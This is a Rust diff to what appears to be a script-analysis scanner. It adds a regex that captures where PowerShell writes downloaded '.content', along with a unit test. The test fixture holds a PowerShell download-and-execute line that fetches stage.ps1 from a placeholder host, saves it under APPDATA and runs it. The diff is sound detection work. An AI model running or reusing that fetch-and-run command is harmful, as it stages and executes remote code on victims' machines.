@@ -354,6 +354,12 @@ static BITS_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
         .expect("bits destination")
 });
 
+#[allow(clippy::expect_used)]
+static CONTENT_REDIRECT_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)\)\s*\.\s*content\s*>{1,2}\s*(?:\\?'([^'\r\n;&|]+)\\?'?|\\?"([^"\r\n;&|]+)\\?"?|([^"'\s;&|]+))"#)
+        .expect("content redirect destination")
+});
+
 // ---- PowerShell obfuscation expansion pre-pass ----
 
 fn logical_statement_at(text: &str, pos: usize) -> &str {
@@ -378,6 +384,7 @@ fn outfile_hint_from(text: &str) -> Option<String> {
         .captures(text)
         .or_else(|| CURL_OUTPUT_RE.captures(text))
         .or_else(|| BITS_DESTINATION_RE.captures(text))
+        .or_else(|| CONTENT_REDIRECT_DESTINATION_RE.captures(text))
         .and_then(first_capture_string)
         .map(normalize_destination_hint)
 }
@@ -4615,6 +4622,28 @@ mod herestring_iex_tests {
                 matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://cache.example/payload.ps1")
             }),
             "download URL was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ps1_iwr_content_redirect_destination_extracted() {
+        let payload = br#"echo (iwr https://redirect-content.example/stage.ps1).content > "$env:APPDATA\stage.ps1"; powershell "$env:APPDATA\stage.ps1""#.to_vec();
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_ps1.push(payload);
+
+        scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, dst, .. }
+                        if src == "https://redirect-content.example/stage.ps1"
+                            && dst.as_deref() == Some("$env:APPDATA\\stage.ps1")
+                )
+            }),
+            "redirected content download destination was not extracted: {:?}",
             env.traits
         );
     }
